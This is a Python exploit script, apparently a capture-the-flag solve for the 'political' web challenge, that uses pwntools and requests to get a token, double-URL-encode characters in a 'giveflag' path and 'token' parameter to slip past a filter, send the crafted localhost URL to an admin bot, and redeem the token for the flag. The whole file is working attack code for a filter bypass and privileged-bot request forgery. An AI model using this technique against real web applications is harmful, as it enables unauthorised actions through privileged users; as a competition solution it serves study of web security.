from pwn import *
import requests
import urllib.parse

# Set up the target URL and port
url = "https://political-web-chal.irisc.tf"
bot_host = "political-bot-chal.irisc.tf"
bot_port = 1337

try:
    # Start a session
    session = requests.Session()

    # Get a valid token
    print("[+] Getting token...")
    token_response = session.get(f"{url}/token")
    token = token_response.text
    print(f"[+] Token received: {token}")

    # Encode the 'g' in 'giveflag' and 't' in 'token'
    encoded_g = urllib.parse.quote(urllib.parse.quote('g'))
    encoded_t = urllib.parse.quote(urllib.parse.quote('t'))
    
    # Construct path and query string with selective encoding
    path = f"{encoded_g}iveflag"
    query_string = f"{encoded_t}oken"

    # Connect to the bot and send the selectively encoded URL
    print("[+] Connecting to admin bot...")
    bot = remote(bot_host, bot_port)
    payload = f"http://localhost:1337/{path}?{query_string}={token}"
    print(f"[+] Sending payload: {payload}")
    bot.sendline(payload.encode())
    bot.close()

    # Wait a moment for the bot to process
    print("[+] Waiting for bot to process...")
    sleep(2)

    # Redeem the token
    print("[+] Attempting to redeem token...")
    redeem_response = session.post(f"{url}/redeem", data={"token": token})

    # Print the flag
    print("[+] Response:")
    print(redeem_response.text)

except Exception as e:
    print(f"[-] Error: {str(e)}")
